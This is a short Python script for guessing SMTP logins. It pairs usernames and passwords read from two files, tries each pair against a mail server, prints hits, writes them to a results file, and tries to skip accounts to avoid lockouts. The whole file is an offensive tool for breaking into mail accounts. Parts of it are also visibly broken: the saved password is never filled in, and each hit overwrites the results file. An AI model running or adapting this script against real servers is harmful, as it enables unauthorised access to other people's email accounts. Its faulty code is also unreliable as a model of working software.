import smtplib
import time

smtp_server = 'smtp.example.com'
smtp_port = 25

with open('username.txt', 'r') as f:
    usernames = [username.strip() for username in f.readlines()]
with open('password.txt', 'r') as f:
    passwords = [password.strip() for password in f.readlines()]
	
login_attempts = {}

for username, password in zip(usernames, passwords):
	if username in login_attempts and time.time() - login_attempts[username] < 15 * 60 and login_attempts[username] != -1:
		continue

	with smtplib.SMTP(smtp_server, smtp_port) as server:
		server.ehlo()
		server.starttls()
		server.ehlo()

		try:
			server.login(username, password)
			with open('result.txt', 'w') as f:
				f.write(f"账号 {username} success！" + ":" + "{password}\n")
				print(f"账号 {username} success！")

			login_attempts[username] = time.time()
		except smtplib.SMTPAuthenticationError:
			pass

		server.quit()
